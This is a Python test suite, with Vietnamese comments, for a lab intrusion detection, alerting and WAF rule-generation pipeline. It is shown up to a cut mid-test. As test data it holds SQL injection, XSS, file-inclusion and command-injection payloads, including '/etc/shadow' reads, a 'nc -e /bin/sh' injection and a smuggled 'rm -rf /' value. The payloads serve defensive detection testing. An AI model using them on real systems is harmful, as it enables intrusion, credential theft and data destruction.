"""Bộ kiểm thử logic cho classifier / responder / tier3 / rulegen / enforcer.

Chạy KHÔNG cần Docker, Kafka hay Elasticsearch (được giả lập):
    python -B tests/test_logic.py
Cần: scikit-learn, scipy, joblib (đúng phiên bản trong services/requirements.txt để nạp model).
Mỗi mục kiểm tra một lỗi logic đã từng xảy ra, để lần sửa sau không tái phạm.
"""
import json, os, re, sys, types, warnings

warnings.filterwarnings("ignore")
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SVC = os.path.join(ROOT, "services")

# ---- giả lập thư viện ngoài ----
ck = types.ModuleType("confluent_kafka"); ck.Consumer = object; ck.Producer = object
sys.modules["confluent_kafka"] = ck
es_mod = types.ModuleType("elasticsearch"); es_mod.helpers = types.SimpleNamespace(); es_mod.Elasticsearch = object
sys.modules["elasticsearch"] = es_mod
sys.path.insert(0, SVC); sys.path.insert(0, os.path.join(ROOT, "web", "enforcer"))

os.environ.update({
    "MODEL_PATH": os.path.join(ROOT, "models", "tier2.joblib"),
    "TIER3_MODEL": os.path.join(ROOT, "models", "tier3.joblib"),
    "TIER1_STRONG": os.path.join(ROOT, "models", "tier1_strong.json"),
    "TIER2_THRESHOLD": "0.90",
    # đúng giá trị trong docker-compose.yml
    "MIN_CONFIDENCE": "0.90", "MAX_AGE_S": "600", "THRESHOLD": "5", "WINDOW_S": "60",
    "LONG_WINDOW_S": "86400", "LONG_THRESHOLD": "12", "TTL_STEPS_S": "900,3600,86400", "MAX_TTL_S": "86400",
    "EXEMPT_CIDRS": "127.0.0.0/8,10.10.30.0/24,10.10.10.10/32,10.10.10.20/32,172.16.0.0/12",
    "INTERNAL_CIDRS": "10.10.30.0/24,10.10.10.10/32,172.16.0.0/12",
    "MIN_CLUSTER": "5", "MIN_BENIGN": "100",
})

FAILS = []
def check(name, cond, detail=""):
    print(("  ok   " if cond else "  FAIL ") + name + (f"  [{detail}]" if detail and not cond else ""))
    if not cond: FAILS.append(name)

class FakeBuf:
    def __init__(self): self.docs = []
    def add(self, idx, doc, _id=None): self.docs.append(doc)
    def maybe_flush(self, force=False): pass
class FakeProd:
    def __init__(self): self.msgs = []
    def produce(self, topic, value=None, key=None): self.msgs.append((topic, key, json.loads(value)))
    def flush(self, *_): pass
    def poll(self, *_): pass

# =====================================================================  common
import common
print("== common.parse_json_line")
check("dòng JSON thường", common.parse_json_line(b'{"a":1}') == {"a": 1})
check("escape \\xhh của Apache", common.parse_json_line(b'{"uri":"/a\\x0bb"}') == {"uri": "/a\x0bb"})
check("escape \\v của Apache không làm mất sự kiện", common.parse_json_line(b'{"uri":"/a\\vb"}') == {"uri": "/a\x0bb"})
check("'\\\\x41' (dấu \\ + x41) không bị sửa nhầm", common.parse_json_line(b'{"u":"\\\\x41\\x41"}') == {"u": "\\x41A"})
check("byte UTF-8 dạng \\xhh ghép lại đúng tiếng Việt",
      common.parse_json_line(b'{"uri":"/ch\\xc3\\xa0o"}') == {"uri": "/chào"})
check("dòng hỏng trả None và được đếm", common.parse_json_line(b"{oops") is None and common.BAD_LINES["n"] >= 1)
check("parse_ts kiểu Suricata (+0000)", abs(common.parse_ts("2026-11-09T09:00:00.500000+0000") - 1794214800.5) < 1e-3)
check("parse_ts chuỗi rác trả default", common.parse_ts("khong-phai-ngay", 7) == 7)

# =====================================================================  classifier
import classifier as C
C.ES_BUF, C.PROD = FakeBuf(), FakeProd()

def cls(uri, query="", body="", ua="Mozilla/5.0"):
    ev = {"uri": uri, "query": ("?" + query) if query else "", "body": body}
    return C.classify(C.decode_p(uri).lower(), C.split_params(query), C.body_params(body), ua, ev)

print("== classifier: URL lành tính không còn bị gán nhãn tấn công (N1)")
BENIGN = [("/product.php", "id=482"), ("/product.php", "c=7&id=482"), ("/shop/list.php", "page=2&cat=shoes"),
          ("/search", "q=laptop&type=new"), ("/x", "lang=vi&sh=1"), ("/x", "a=1&nc=123"), ("/x", "onload=1"),
          ("/report", "date=2026-11-09&page=2"),
          ("/x", "t=2026-11-09T10%3A00%3A00Z"), ("/x", "price=10-20&sort=asc"), ("/x", "email=alice%40example.com"),
          ("/x", "q=C%2B%2B"), ("/x", "msg=xin+ch%C3%A0o"), ("/docs/a/b/c/d/e/f/guide.pdf", ""),
          ("/x", "ref=newsletter&utm_source=mail&utm_campaign=nov"), ("/x", "q=select+a+plan"),
          ("/vulnerabilities/sqli/", "id=laptop&Submit=Submit"), ("/vulnerabilities/sqli/", "id=order+by+price&Submit=Submit"),
          ("/", "")]
for u, q in BENIGN:
    r = cls(u, q)
    check(f"lành tính: {u}?{q}", r["label"] == "benign", f"{r['label']} tier{r['tier']} {r['rule']}")
# Hai URL dưới đây KHÔNG còn bị regex tầng 1 bắt, nhưng model tầng 2 hiện tại (run_4) vẫn có thể
# báo nhầm vì giá trị có ký tự cú pháp ('..', '='). Chỉ huấn luyện lại model mới hết hẳn — in ra để theo dõi.
for u, q in [("/a", "redirect=..%2Fhome"), ("/x", "q=a+and+1%3D1")]:
    r = cls(u, q)
    check(f"tầng 1 không bắt nhầm: {u}?{q}", r["tier"] != 1, str(r))
    if r["label"] != "benign":
        print(f"       (giới hạn đã biết của model tầng 2: {u}?{q} -> {r['label']} {r['conf']:.2f})")
r = cls("/login.php", "", "username=admin&password=password&Login=Login&user_token=0123456789abcdef0123456789abcdef")
check("POST đăng nhập lành tính", r["label"] == "benign", str(r))
r = cls("/vulnerabilities/exec/", "", "ip=8.8.8.8&Submit=Submit")
check("POST ping lành tính", r["label"] == "benign", str(r))

print("== classifier: tấn công vẫn bị bắt, có bằng chứng (trường + chuỗi khớp)")
ATTACKS = [("sqli", "/vulnerabilities/sqli/", "id=1'%20OR%20'1'='1&Submit=Submit", ""),
           ("sqli", "/vulnerabilities/sqli/", "id=1%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit", ""),
           ("sqli", "/vulnerabilities/sqli/", "id=1'%20AND%20SLEEP(2)--&Submit=Submit", ""),
           ("sqli", "/x", "id=1+or+1%3D1", ""),
           ("sqli", "/vulnerabilities/sqli/", "id=1'%20AND%20extractvalue(1,concat(0x7e,version()))--%20-&Submit=Submit", ""),
           ("xss", "/vulnerabilities/xss_r/", "name=%3Cscript%3Ealert(1)%3C/script%3E", ""),
           ("xss", "/vulnerabilities/xss_r/", "name=%3Cimg%20src=x%20onerror=alert(1)%3E", ""),
           ("lfi", "/vulnerabilities/fi/", "page=../../../../etc/passwd", ""),
           ("lfi", "/vulnerabilities/fi/", "page=....//....//etc/passwd", ""),
           ("lfi", "/x", "f=php://filter/convert.base64-encode/resource=index", ""),
           ("rce", "/vulnerabilities/exec/", "", "ip=127.0.0.1%3Bcat+%2Fetc%2Fshadow&Submit=Submit"),
           ("rce", "/vulnerabilities/exec/", "", "ip=127.0.0.1%7Cwhoami&Submit=Submit"),
           ("rce", "/vulnerabilities/exec/", "", "ip=127.0.0.1%3Bid&Submit=Submit"),
           ("rce", "/x", "c=%24(whoami)", ""),
           ("recon", "/phpmyadmin/index.php", "", "")]
for want, u, q, b in ATTACKS:
    r = cls(u, q, b)
    check(f"{want}: {u}?{q or b}"[:90], r["label"] == want and r["field"] and r["evidence"] is not None, str(r))
r = cls("/vulnerabilities/sqli/", "id=1'%20OR%20'1'='1&Submit=Submit")
check("bằng chứng nêu đúng tham số", r["field"] == "ARGS_GET:id", r["field"])
r = cls("/x", "%3Cscript%3Ealert(1)%3C/script%3E=1")
check("payload đặt ở TÊN tham số vẫn bị bắt", r["label"] == "xss", str(r))
check("payload trong thân POST được tầng 1 thấy", cls("/vulnerabilities/exec/", "", "ip=127.0.0.1%3Bcat+/etc/passwd")["tier"] == 1)
check("'c++' không bị giải mã '+' lần hai", C.decode_q("C%2B%2B") == "C++")
check("mã hoá kép vẫn được giải", C.decode_q("%2527") == "'")

print("== classifier: cổng cú pháp tầng 2 (N2 — giảm báo nhầm của model)")
for q in ["date=2026-11-09&page=2", "t=2026-11-09T10:00:00Z", "price=10-20", "email=alice@example.com", "id=482"]:
    ev = {"uri": "/x", "query": "?" + q, "body": ""}
    gate = " ".join(v for _, v in C.split_params(q))
    check(f"model không được hỏi cho '{q}'", C.tier2(ev, gate) is None)

print("== classifier: sự kiện Suricata mang THỜI ĐIỂM SỰ KIỆN (C7)")
buf, prod = FakeBuf(), FakeProd()
C.handle_net({"event_type": "alert", "timestamp": "2026-11-09T09:00:00.000000+0000", "src_ip": "10.10.10.66",
              "dest_ip": "10.10.10.10", "alert": {"signature": "ET WEB_SERVER SQL Injection", "category": "Web Application Attack",
              "severity": 1, "metadata": {"signature_severity": ["Critical"]}}, "http": {"url": "/a?id=1"}}, buf, prod)
check("alert net có ts = thời điểm cảm biến", prod.msgs and abs(prod.msgs[0][2]["ts"] - 1794214800.0) < 1)
check("danh mục 'Command and Control' không bị gán rce",
      C.suricata_class({"category": "Malware Command and Control Activity Detected", "signature": "ET MALWARE x"}) != "rce")
buf, prod = FakeBuf(), FakeProd()
C.handle_net({"event_type": "anomaly", "timestamp": "2026-11-09T09:00:00.000000+0000", "src_ip": "10.10.10.66",
              "dest_ip": "10.10.10.10", "app_proto": "http", "anomaly": {"type": "applayer", "event": "INVALID_REQUEST_LINE"}}, buf, prod)
check("yêu cầu HTTP dị dạng (C2) được gắn nhãn và báo", buf.docs[0]["label"] == "anomaly" and prod.msgs[0][2]["confidence"] < 0.9)

print("== classifier: luồng web đầy đủ (ghép thân từ audit, lưu arg_n/arg_v)")
C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/vulnerabilities/exec/",
              "query": "", "status": 302, "ua": "curl", "req_id": "R1"})
check("POST chưa có audit thì chờ", "R1" in C.PENDING and not C.ES_BUF.docs)
C.handle_audit({"transaction": {"transaction_id": "R1"}, "request": {"body": ["ip=127.0.0.1%3Bid&Submit=Submit"]},
                "audit_data": {"action": {"intercepted": False}}})
d = C.ES_BUF.docs[0]
check("có audit -> phân loại ngay, thấy payload trong thân", d["label"] == "rce" and d["has_body"])
check("lưu tên/giá trị tham số cho rulegen", d["arg_n"] == ["ip", "submit"] and d["arg_v"][0] == "127.0.0.1;id")
check("waf_blocked lấy từ audit", d["waf_blocked"] is False)
check("cảnh báo web mang ts sự kiện", abs(C.PROD.msgs[0][2]["ts"] - 1794214800.0) < 1e-6)
check("không có Content-Type -> ModSecurity không tách thân: marg chỉ có query (rỗng)",
      d["marg_n"] == [] and d["marg_body"] is False)
C.ES_BUF, C.PROD = FakeBuf(), FakeProd()
C.handle_web({"ts_ms": 1794214800000, "src_ip": "10.10.10.66", "method": "POST", "uri": "/vulnerabilities/exec/",
              "query": "?x=%2527A%2BB", "status": 302, "ua": "curl", "req_id": "R2",
              "ct": "application/x-www-form-urlencoded; charset=UTF-8"})
C.handle_audit({"transaction": {"transaction_id": "R2"}, "request": {"body": ["ip=127.0.0.1%3BID&Submit=Submit"]},
                "audit_data": {"action": {"intercepted": False}}})
d = C.ES_BUF.docs[0]
check("marg = ARGS như ModSecurity: giải mã MỘT lần, giữ hoa thường, gồm cả thân urlencoded",
      d["marg_n"] == ["x", "ip", "Submit"] and d["marg_v"] == ["%27A+B", "127.0.0.1;ID", "Submit"] and d["marg_body"],
      repr((d["marg_n"], d["marg_v"])))
check("arg_v vẫn là góc nhìn của classifier (giải mã nhiều lần, chữ thường)", d["arg_v"][0] == "'a+b", repr(d["arg_v"]))

# =====================================================================  responder
import responder as R
R.es_buf, R.prod = FakeBuf(), FakeProd()
R.atomic_write = lambda *a: None
clock = [2_000_000.0]
R.time.time = lambda: clock[0]
def alert(ip, cls="sqli", conf=0.9, source="web", target=None, age=0.0, **kw):
    a = {"alert_id": "x", "ts": clock[0] - age, "src_ip": ip, "class": cls, "confidence": conf, "source": source, **kw}
    if target is not None: a["target"] = target
    R.decide(a); return R.es_buf.docs[-1]

print("== responder: ngưỡng ngắn 5/60s hoạt động đúng (C1)")
dec = []
for i in range(5):
    dec.append(alert("10.10.10.102", target=f"/a?id={i}")); clock[0] += 1
check("4 cảnh báo đầu chỉ đếm", all(d["decision"] == "count" for d in dec[:4]), str([d["reason"] for d in dec]))
check("cảnh báo thứ 5 mới chặn, lý do 'threshold'", dec[4]["decision"] == "block" and dec[4]["reason"] == "threshold", str(dec[4]))
check("bản ghi kiểm toán có 'decided_by' và hạn chặn", dec[4].get("decided_by") and dec[4].get("expires") and dec[4]["ttl_s"] == 900)
check("3 cảnh báo (kịch bản sqli của demo) KHÔNG bị chặn",
      [alert("10.10.10.103", target=f"/b?{i}")["decision"] for i in range(3)] == ["count"] * 3)

print("== responder: tấn công rải rác 1 request / 10 phút bị bắt bởi cửa sổ 24 giờ (B5)")
dec = []
for i in range(12):
    dec.append(alert("10.10.10.200", target=f"/c?{i}")); clock[0] += 600
check("11 lần đầu chưa chặn", all(d["decision"] == "count" for d in dec[:11]))
check("lần thứ 12 chặn, lý do 'long_window'", dec[11]["decision"] == "block" and dec[11]["reason"] == "long_window", str(dec[11]))

print("== responder: một request do 2 cảm biến báo chỉ tính 1 lần (C9)")
clock[0] += 100000
d1 = alert("10.10.10.220", target="/vulnerabilities/sqli/?id=1' or '1'='1&submit=submit")
d2 = alert("10.10.10.220", source="net", conf=0.95, target="/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit")
check("bản thứ hai từ Suricata là 'duplicate_sensor'", d1["decision"] == "count" and d2["reason"] == "duplicate_sensor", str(d2))
d3 = alert("10.10.10.220", target="/vulnerabilities/sqli/?id=1' or '1'='1&submit=submit")
check("cùng URL gửi LẦN NỮA vẫn được đếm", d3["decision"] == "count" and d3["reason"].startswith("2/5"), str(d3))

print("== responder: lọc tuổi, độ tin cậy, miễn trừ, tái phạm")
check("cảnh báo cũ hơn 10 phút bị bỏ", alert("10.10.10.230", age=601)["reason"] == "stale")
check("cảnh báo 5 phút tuổi vẫn tính", alert("10.10.10.231", age=300)["decision"] == "count")
check("độ tin cậy 0.85 < θ bị bỏ", alert("10.10.10.232", conf=0.85)["reason"] == "low_confidence")
check("IP miễn trừ luôn bỏ qua trước tiên", alert("10.10.10.20", cls="behaviour", immediate=True)["reason"] == "exempt")
ttl = []
for i in range(4):
    d = alert("10.10.10.210", cls="behaviour", source="behaviour", immediate=True)
    ttl.append(d.get("ttl_s")); clock[0] += d["ttl_s"] + 11; R.sweep()
check("TTL theo bậc của spec: 15 phút → 1 giờ → 24 giờ (E4)", ttl == [900, 3600, 86400, 86400], str(ttl))
R.sweep(); clock[0] += 90000; R.sweep()
check("bộ đếm hết hạn được dọn (không phình mãi)", len(R.hits) == 0 and len(R.seen) == 0, f"{len(R.hits)} {len(R.seen)}")

print("== responder: lệnh quản trị qua nsm.control (nsmctl) — gỡ chặn / miễn trừ không xoá trạng thái")
def ctl(cmd, age=0.0, **kw):
    R.control({"cmd": cmd, "id": "t1", "ts": clock[0] - age, **kw}); return R.es_buf.docs[-1]
clock[0] += 100000
for i in range(5): alert("10.10.10.180", target=f"/a?id={i}' union select 1")
alert("10.10.10.181", target="/a?id=1' or '1'='1")
check("chuẩn bị: .180 đang bị chặn, .181 đang được đếm",
      R.state["blocks"].get("10.10.10.180", {}).get("active") and "10.10.10.181" in R.hits)
n_pub = len(R.prod.msgs)
d = ctl("unblock", ip="10.10.10.180")
check("unblock gỡ đúng một IP và ghi kiểm toán", d["decision"] == "unblock" and d["reason"] == "manual" and d["was_blocked"]
      and "10.10.10.180" not in R.state["blocks"] and d["ctl_id"] == "t1", str(d))
check("unblock phát lại danh sách chặn không còn IP đó",
      len(R.prod.msgs) == n_pub + 1 and "10.10.10.180" not in R.prod.msgs[-1][2]["ips"])
check("unblock không đụng tới bộ đếm của IP khác", "10.10.10.181" in R.hits)
d = ctl("unblock", ip="10.10.10.180; rm -rf /")
check("địa chỉ không hợp lệ bị từ chối", d["decision"] == "ctl_reject" and d["reason"] == "invalid_argument")
d = ctl("unblock", ip="10.10.10.181", age=3600)
check("lệnh cũ (phát lại sau 1 giờ) bị bỏ", d["decision"] == "ctl_reject" and d["reason"] == "stale" and "10.10.10.181" in R.hits)
for i in range(5): alert("10.10.10.182", target=f"/b?id={i}' union select 1")
d = ctl("exempt_add", cidr="10.10.10.182/31")
check("exempt_add: thêm dải, gỡ luôn IP đang bị chặn trong dải, lưu vào trạng thái",
      d["decision"] == "exempt_add" and "10.10.10.182" not in R.state["blocks"] and R.state["exempt_extra"] == ["10.10.10.182/31"], str(d))
d = alert("10.10.10.183")
check("IP trong dải miễn trừ thêm lúc chạy không bị đếm", d["decision"] == "skip" and d["reason"] == "exempt")
d = ctl("exempt_del", cidr="10.10.10.20/32")
check("exempt_del không bỏ được dải theo cấu hình", d["decision"] == "ctl_reject" and d["reason"] == "not_in_runtime_list")
d = ctl("exempt_del", cidr="10.10.10.182/31")
check("exempt_del bỏ dải đã thêm", d["decision"] == "exempt_del" and R.state["exempt_extra"] == [] and alert("10.10.10.183")["decision"] == "count")
check("lệnh lạ bị từ chối", ctl("shutdown")["reason"] == "unknown_command")

# =====================================================================  tier3
import tier3 as T
print("== tier3: cổng định hình và cửa sổ trượt (N5, T14)")
def run_tier3(events, ip="10.10.10.107", t0=3_000_000.0, spread=3.0):
    T.st.clear(); buf, prod = FakeBuf(), FakeProd()
    T.time.time = lambda: t0 + spread + 1
    for i, (uri, status, method, query) in enumerate(events):
        T.add({"src_ip": ip, "ts_ms": (t0 + spread * i / max(len(events), 1)) * 1000, "uri": uri, "status": status,
               "method": method, "query": query}, prod, buf)
    T.time.time = lambda: t0 + spread + 4
    T.sweep(prod, buf)
    return prod.msgs
m = run_tier3([(f"/secret_{i}.php", 404, "GET", "") for i in range(40)])
check("dò 40 đường dẫn 404 -> báo 'recon'", m and m[0][2]["shape"] == "recon" and m[0][2]["immediate"], str(m[:1]))
check("cảnh báo tầng 3 mang thời điểm sự kiện", m and m[0][2]["ts"] < 3_000_000.0 + 4)
check("báo ngay trong đợt, không chờ hết phút", len(m) == 1)
m = run_tier3([("/index.php", 302, "GET", "")] * 150)
check("flood 150 request/phút -> báo 'flood'", m and m[0][2]["shape"] == "flood", str(m[:1]))
m = run_tier3([("/login.php", 302, "POST", "")] * 60)
check("dò mật khẩu 60 POST/phút -> báo 'bruteforce'", m and m[0][2]["shape"] == "bruteforce", str(m[:1]))
m = run_tier3([("/login.php", 401, "GET", f"?u=a{i}") for i in range(20)])
check("20 lần 401 liên tiếp -> báo 'denied'", m and m[0][2]["shape"] == "denied", str(m[:1]))
check("trình duyệt: 1 trang + 19 file tĩnh KHÔNG bị báo",
      not run_tier3([("/", 200, "GET", "")] + [(f"/static/f{i}.css", 200, "GET", "") for i in range(19)]))
check("trình duyệt: 3 trang + 40 file tĩnh KHÔNG bị báo",
      not run_tier3([(f"/p{i}", 200, "GET", "") for i in range(3)] + [(f"/static/f{i}.js", 200, "GET", "") for i in range(40)]))
check("16 lượt tìm kiếm khác nhau KHÔNG bị báo", not run_tier3([("/search", 200, "GET", f"?q=tu{i}") for i in range(16)]))
check("bot tìm kiếm 30 trang (200) KHÔNG bị báo", not run_tier3([(f"/bai-viet/{i}", 200, "GET", "") for i in range(30)]))
check("IP nội bộ bị bỏ qua", not run_tier3([(f"/s{i}", 404, "GET", "") for i in range(40)], ip="10.10.30.5"))
# sự kiện đến lệch thứ tự (đọc bù nhiều partition) không làm vỡ cửa sổ
import random
ev = [(f"/secret_{i}.php", 404, "GET", "") for i in range(40)]; random.Random(1).shuffle(ev)
T.st.clear(); buf, prod = FakeBuf(), FakeProd(); T.time.time = lambda: 3_000_100.0
order = list(range(40)); random.Random(2).shuffle(order)
for k in order:
    T.add({"src_ip": "10.10.10.107", "ts_ms": (3_000_000.0 + k * 0.05) * 1000, "uri": ev[k][0], "status": 404, "method": "GET", "query": ""}, prod, buf)
check("sự kiện lệch thứ tự vẫn phát hiện được", len(prod.msgs) >= 1)

# =====================================================================  rulegen
import rulegen as G
print("== rulegen: trích bất biến từ GIÁ TRỊ tham số (N4, C2, C3)")
def corpus_of(urls):
    c = G.Corpus()
    for u in urls: c.add([v for _, v in G._split(u.split("?", 1)[1] if "?" in u else "")] or [u])
    c.seal(); return c
LAB = ["/vulnerabilities/sqli/?id=%s&submit=submit" % q for q in ["laptop", "chuot", "ban phim", "order by price"]] * 30
corp = corpus_of(LAB + ["/index.php?q=laptop", "/vulnerabilities/fi/?page=include.php", "/vulnerabilities/xss_r/?name=alice"])
def S(name, vals, extra=(("submit", "submit"),)): return [[(name, v)] + list(extra) for v in vals]
sq = S("id", ["1' union select 1,2-- -", "1' union select user,pass-- -", "1' union select null,version()-- -",
              "1' union select table_name,2 from dual-- -", "1' union select 3,4-- -"])
tok, idx = G.invariant(sq, corp)
check("sqli: bất biến là \"' union select\" (không dính đường dẫn, không dính số)", tok == "' union select", repr(tok))
check("sqli: đích luật hẹp nhất ARGS:id", G.narrow_target(lambda v: tok in v, sq, idx) == "ARGS:id")
for v in ["2' union select 1,2-- -", "99' union select a,b from t"]:
    check(f"biến thể {v!r} vẫn bị luật bắt", tok in v)
xs = S("name", ["<script>alert(1)</script>", "<script>alert(document.cookie)</script>", "<script>alert(2)</script>",
                "<script>prompt(1)</script>", "<script>confirm(3)</script>"], extra=())
tok, _ = G.invariant(xs, corp)
check("xss: bất biến chứa thẻ script", tok is not None and "script>" in tok, repr(tok))
lf = S("page", ["../../../../etc/passwd", "../../../etc/passwd", "../../etc/passwd", "....//....//etc/passwd", "/var/www/../../etc/passwd"], extra=())
tok, _ = G.invariant(lf, corp)
check("lfi: bất biến là '/etc/passwd'", tok == "/etc/passwd", repr(tok))
toks = {G.invariant(sq, corp)[0] for _ in range(5)}
check("kết quả tất định", len(toks) == 1)

print("== rulegen: không thể sinh luật chỉ là tên endpoint / tên tham số (N4)")
div = S("q", ["1' or '1'='1", "<svg/onload=alert(1)>", "../../etc/passwd", "1;waitfor delay '0:0:5'--", "admin'--",
              "{{7*7}}", "1 and sleep(5)", "x' union all select null--"], extra=())
tok, _ = G.invariant(div, corp)
check("payload đa dạng vào một endpoint: không có luật 'chặn endpoint'", tok is None or ("orders" not in tok and "q=" not in tok), repr(tok))
scn = [[("id", str(i)), ("ref", "home")] for i in range(1, 9)]
check("URL bình thường của công cụ quét: không sinh luật", G.invariant(scn, corp)[0] is None)
for t in ["&submit=submit", "?page=", "/api/v1/orders/search?q=", "id=1", "/shop/item.php"]:
    check(f"is_specific({t!r}) = False", not G.is_specific(t))
for t in ["' union select", "<script>", "../../etc/passwd", "'--"]:
    check(f"is_specific({t!r}) = True", G.is_specific(t))
check("nhãn scanner/recon không nằm trong lớp sinh luật", "scanner" not in G.ATTACK_LABELS and "recon" not in G.ATTACK_LABELS)

print("== rulegen: luật RCE @rx không chặn URL lành tính (N3)")
check("rx bắt payload thật", all(G.RCE_RE.search(v) for v in ["127.0.0.1;cat /etc/passwd", "127.0.0.1|nc -e /bin/sh", "127.0.0.1;id", "x && whoami", "a`id`"]))
for v in ["482", "shoes", "new", "asc", "8h", "1", "laptop", "tom & jerry", "bed & head", "r&d type"]:
    check(f"rx không khớp giá trị lành tính {v!r}", not G.RCE_RE.search(v))
r = {"id": 9900000, "class": "rce", "token": G.RCE_RX, "op": "rx", "target": "ARGS:ip", "state": "active"}
line = G.render(r)
check("luật chỉ nhắm ARGS, không nhắm REQUEST_URI / User-Agent", line.startswith("SecRule ARGS:ip ") and "REQUEST_URI" not in line and "User-Agent" not in line)
check("rule_hits tôn trọng tên tham số", G.rule_hits(r, {"arg": [("ip", "1;id")], "marg": []})
      and not G.rule_hits(r, {"arg": [("q", "1;id")], "marg": []}))

print("== rulegen: kiểm chứng corpus và kiểm tra tĩnh (C4, T13, L6)")
c2 = corpus_of(["/s?q=it's a 'union select' tutorial"])
check("token có trong lưu lượng lành tính bị loại", c2.rejects(token="union select"))
check("token sạch thì không bị loại", not corp.rejects(token="' union select"))
check("ε là tỷ lệ: 1/1000 mẫu khớp vẫn qua khi ε=1%", (setattr(G, "EPSILON", 0.01), corpus_of(["/s?q=x' or"] + ["/s?q=ok"] * 999).rejects(token="' or"), setattr(G, "EPSILON", 0.0))[1] is False)
ok_rule = {"id": 9900001, "class": "sqli", "token": "' union select", "op": "contains", "target": "ARGS:id", "state": "shadow"}
check("luật hợp lệ qua static_check", G.static_check(ok_rule))
check("token chứa ${...} bị loại", not G.static_check({**ok_rule, "token": "cat${ifs}/etc/passwd"}))
check("đích ngoài ARGS bị loại", not G.static_check({**ok_rule, "target": "REQUEST_URI|ARGS"}))
check("regex lạ (không phải RCE_RX) bị loại", not G.static_check({**ok_rule, "op": "rx", "token": "(a+)+$"}))
check("id ngoài dải tự sinh bị loại", not G.static_check({**ok_rule, "id": 942100}))

print("== rulegen: một chu kỳ đầy đủ với Elasticsearch giả lập (bộ g0)")
G.SELECTOR = "g0"
class FakeES:
    def __init__(self): self.indexed = {}; self.events = []; self.indices = types.SimpleNamespace(get=lambda **k: {}, delete=lambda **k: None)
    def index(self, index, id, document): self.indexed[id] = document
    def search(self, **k):
        tot, bad = {}, {}
        for e in self.events:
            tot[e["src_ip"]] = tot.get(e["src_ip"], 0) + 1
            if e["label"] != "benign": bad[e["src_ip"]] = bad.get(e["src_ip"], 0) + 1
        return {"aggregations": {"ips": {"buckets": [{"key": i, "doc_count": n, "bad": {"doc_count": bad.get(i, 0)}}
                                                     for i, n in tot.items()]}}}
fes = FakeES(); G.es = fes; G.prod = FakeProd(); G.atomic_write = lambda *a: None
def fake_scan(es, index, query, **k):
    labels = None
    for f in query["query"]["bool"]["filter"]:
        if "terms" in f: labels = set(f["terms"]["label.keyword"])
    for e in fes.events:
        if labels is None or e["label"] in labels: yield {"_source": e}
G.helpers.scan = fake_scan
published = []
G.publish = lambda conf: (published.append(conf), ("sha", True))[1]
def web(ip, label, args, status=200):
    return {"src_ip": ip, "label": label, "status": status, "target": "/t", "body": "",
            "arg_n": [n for n, _ in args], "arg_v": [v for _, v in args]}
G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
attack_events = [web(f"10.10.10.13{i % 2 + 3}", "sqli", s) for i, s in enumerate(sq * 2)]
fes.events = attack_events + [web("10.10.10.20", "benign", [("id", "laptop"), ("submit", "submit")])] * 20
G.cycle()
check("corpus chưa đủ (20 < 100) -> KHÔNG sinh luật (an toàn khi hỏng)", not G.state["rules"])
fes.events = attack_events + [web("10.10.10.20", "benign", [("id", "laptop"), ("submit", "submit")])] * 150 \
             + [web("10.10.10.133", "benign", [("id", "1' union select 9,9-- -")])]      # mẫu tấn công bị gán nhầm benign
G.cycle()
rules = list(G.state["rules"].values())
check("đủ corpus -> sinh 1 luật shadow cho sqli", len(rules) == 1 and rules[0]["state"] == "shadow", str(rules))
check("mẫu 'benign' từ IP tấn công KHÔNG phủ quyết được luật (C5)", rules and rules[0]["token"] == "' union select")
check("luật shadow dùng hành động pass", published and "pass,log" in published[-1] and "deny" not in published[-1])
n_pub = len(published)
G.cycle()
check("tệp luật không đổi thì không phát lại (T2)", len(published) == n_pub)
rules[0]["since"] -= G.SHADOW + 1
G.cycle()
check("hết thời gian chạy thử -> ban hành (deny)", rules[0]["state"] == "active" and "deny,status:403" in published[-1])
fes.events.append(web("10.10.10.20", "benign", [("q", "it's ' union select tutorial")]))
G.cycle()
check("nguồn SẠCH có giá trị khớp -> luật bị thu hồi", rules[0]["state"] == "rejected" and rules[0]["reason"] == "benign_hit")
G.helpers.scan = lambda *a, **k: (_ for _ in ()).throw(ConnectionError("ES down"))
before = json.dumps(G.state, sort_keys=True)
try: G.cycle(); raised = False
except ConnectionError: raised = True
check("Elasticsearch lỗi -> chu kỳ dừng, không đổi tập luật (E3)", raised and json.dumps(G.state, sort_keys=True) == before)

print("== rulegen: một nhãn nhầm không làm mất corpus của người dùng hợp lệ")
G.helpers.scan = fake_scan
fes.events = [web("10.10.10.20", "benign", [("id", "laptop")])] * 100 + [web("10.10.10.20", "sqli", [("id", "order by price")])] \
             + [web("10.10.10.66", "sqli", [("id", "1' or 1=1-- -")])] * 5 + [web("10.10.10.66", "benign", [("id", "1")])]
bad_ips = G.attacker_ips(3600)
check("1 nhãn tấn công / 101 request: vẫn là nguồn sạch", "10.10.10.20" not in bad_ips, str(bad_ips))
check("IP tấn công thật (5/6 request): bị loại khỏi corpus", "10.10.10.66" in bad_ips, str(bad_ips))

print("== rulegen: bộ chọn G2r (luật đặc tả theo góc nhìn ModSecurity)")
import enforcer as F
G.helpers.scan = fake_scan
G.SELECTOR = "g2r"
G.RULESEL_MODEL = os.path.join(ROOT, "models", "rulesel_g2r.joblib")
G.RULESEL_PRIOR = os.path.join(ROOT, "models", "rulesel_prior.json.gz")
G.g2r = G.load_selector()
check("nạp được model G2r và kho nền đóng băng", G.g2r is not None)
def mweb(ip, label, args, status=200):
    e = web(ip, label, args, status); e["marg_n"] = [n for n, _ in args]; e["marg_v"] = [v for _, v in args]
    return e
G.state.clear(); G.state.update({"next_id": G.BASE_ID, "rules": {}})
sq_m = ["1' union select 1,2-- -", "1' UNION SELECT user,pass-- -", "1' union select null,version()-- -",
        "1' union  select table_name,2 from dual-- -", "1' union select 3,4-- -", "5' union select a,b#",
        "9' union/**/select 1,2-- -", "3' union select load_file(0x2f),2-- -"]
fes.events = [mweb(f"10.10.10.{140 + i}", "sqli", [("id", v)]) for i, v in enumerate(sq_m)] \
             + [mweb("10.10.10.20", "benign", [("id", "laptop"), ("q", "order by price")])] * 150
published.clear()
G.cycle()
spec_rules = [r for r in G.state["rules"].values() if G.is_spec(r)]
check("G2r sinh luật đặc tả ở trạng thái shadow", bool(spec_rules) and all(r["state"] == "shadow" for r in spec_rules),
      str([(r.get("token"), r.get("score")) for r in spec_rules]))
if spec_rules:
